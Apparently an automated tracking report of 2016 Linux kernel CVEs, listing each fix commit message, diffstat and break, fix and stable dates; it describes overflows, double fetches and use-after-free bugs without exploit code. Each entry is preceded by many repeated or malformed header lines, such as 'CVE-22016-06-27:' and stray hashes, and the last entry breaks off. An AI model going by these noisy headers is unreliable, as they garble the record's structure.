CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 93a2001bdfd5376c3dc2158653034c20392d15c5
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Thu Jun 23 08:59:47 2016 -0600

    HID: hiddev: validate num_values for HIDIOCGUSAGES, HIDIOCSUSAGES commands
    
    This patch validates the num_values parameter from userland during the
    HIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set
    to HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter
    leading to a heap overflow.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/usbhid/hiddev.c |   10 +++++-----
 1 file changed, 5 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5829
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-24
Linus Commit: 93a2001bdfd5376c3dc2158653034c20392d15c5
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: 22e658d19a1a64512d49de2632ad2124e6f9e429
Stable Tag: 3.14.74

CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.79.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Author: Martin Schwidefsky <schwidefsky@de.ibm.com>
Date:   Mon Apr 25 17:54:28 2016 +0200

    s390/sclp_ctl: fix potential information leak with /dev/sclp
    
    The sclp_ctl_ioctl_sccb function uses two copy_from_user calls to
    retrieve the sclp request from user space. The first copy_from_user
    fetches the length of the request which is stored in the first two
    bytes of the request. The second copy_from_user gets the complete
    sclp request, but this copies the length field a second time.
    A malicious user may have changed the length in the meantime.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com>
    Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

 drivers/s390/char/sclp_ctl.c |   12 +++++++-----
 1 file changed, 7 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-6130
Break Date: 2013-06-26
Break Commit: d475f942b1dd6a897dac3ad4ed98d6994b275378
Break Tag: 3.11
Linus Fix Date: 2016-04-27
Linus Commit: 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Linus Tag: 4.6
Stable Date: 2016-09-11
Stable Commit: 78a4260f1fad5cfc6ad7cf6e01a93a2fed0d0e3e
Stable Tag: 3.14.79

CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 43761473c254b45883a64441dd0bc85a42f3645c
Author: Paul Moore <paul@paul-moore.com>
Date:   Tue Jul 19 17:42:57 2016 -0400

    audit: fix a double fetch in audit_log_single_execve_arg()
    
    There is a double fetch problem in audit_log_single_execve_arg()
    where we first check the execve(2) argumnets for any "bad" characters
    which would require hex encoding and then re-fetch the arguments for
    logging in the audit record[1].  Of course this leaves a window of
    opportunity for an unsavory application to munge with the data.
    
    This patch reworks things by only fetching the argument data once[2]
    into a buffer where it is scanned and logged into the audit
    records(s).  In addition to fixing the double fetch, this patch
    improves on the original code in a few other ways: better handling
    of large arguments which require encoding, stricter record length
    checking, and some performance improvements (completely unverified,
    but we got rid of some strlen() calls, that's got to be a good
    thing).
    
    As part of the development of this patch, I've also created a basic
    regression test for the audit-testsuite, the test can be tracked on
    GitHub at the following link:
    
     * https://github.com/linux-audit/audit-testsuite/issues/25
    
    [1] If you pay careful attention, there is actually a triple fetch
    problem due to a strnlen_user() call at the top of the function.
    
    [2] This is a tiny white lie, we do make a call to strnlen_user()
    prior to fetching the argument data.  I don't like it, but due to the
    way the audit record is structured we really have no choice unless we
    copy the entire argument at once (which would require a rather
    wasteful allocation).  The good news is that with this patch the
    kernel no longer relies on this strnlen_user() value for anything
    beyond recording it in the log, we also update it with a trustworthy
    value whenever possible.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Paul Moore <paul@paul-moore.com>

 kernel/auditsc.c |  332 +++++++++++++++++++++++++++---------------------------
 1 file changed, 164 insertions(+), 168 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6136
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-07-20
Linus Commit: 43761473c254b45883a64441dd0bc85a42f3645c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 096cdc6f52225835ff503f987a0d68ef770bb78e
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Tue Jun 21 16:58:46 2016 +0300

    platform/chrome: cros_ec_dev - double fetch bug in ioctl
    
    We verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure
    that those values have not changed between the two copy_from_user()
    calls.  Otherwise it could lead to a buffer overflow.
    
    Additionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value.
    We should use the new smaller value so we don't copy too much data to
    the user.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Tested-by: Gwendal Grignou <gwendal@chromium.org>
    Cc: <stable@vger.kernel.org> # v4.2+
    Signed-off-by: Olof Johansson <olof@lixom.net>

 drivers/platform/chrome/cros_ec_dev.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6156
Break Date: 2015-06-15
Break Commit: a841178445bb72a3d566b4e6ab9d19e9b002eb47
Break Tag: 4.2
Linus Fix Date: 2016-07-05
Linus Commit: 096cdc6f52225835ff503f987a0d68ef770bb78e
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
4.5:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
4.5:
4.5:
CVE-2016-6187:
CVE-2016-6187:
2016-07-08:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Author: Vegard Nossum <vegard.nossum@oracle.com>
Date:   Thu Jul 7 13:41:11 2016 -0700

    apparmor: fix oops, validate buffer size in apparmor_setprocattr()
    
    When proc_pid_attr_write() was changed to use memdup_user apparmor's
    (interface violating) assumption that the setprocattr buffer was always
    a single page was violated.
    
    The size test is not strictly speaking needed as proc_pid_attr_write()
    will reject anything larger, but for the sake of robustness we can keep
    it in.
    
    SMACK and SELinux look safe to me, but somebody else should probably
    have a look just in case.
    
    Based on original patch from Vegard Nossum <vegard.nossum@oracle.com>
    modified for the case that apparmor provides null termination.
    
    Fixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a
    Reported-by: Vegard Nossum <vegard.nossum@oracle.com>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: John Johansen <john.johansen@canonical.com>
    Cc: Paul Moore <paul@paul-moore.com>
    Cc: Stephen Smalley <sds@tycho.nsa.gov>
    Cc: Eric Paris <eparis@parisplace.org>
    Cc: Casey Schaufler <casey@schaufler-ca.com>
    Cc: stable@kernel.org
    Signed-off-by: John Johansen <john.johansen@canonical.com>
    Reviewed-by: Tyler Hicks <tyhicks@canonical.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/apparmor/lsm.c |   36 +++++++++++++++++++-----------------
 1 file changed, 19 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6187
Break Date: 2016-01-04
Break Commit: bb646cdb12e75d82258c2f2e7746d5952d3e321a
Break Tag: 4.5
Linus Fix Date: 2016-07-08
Linus Commit: 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
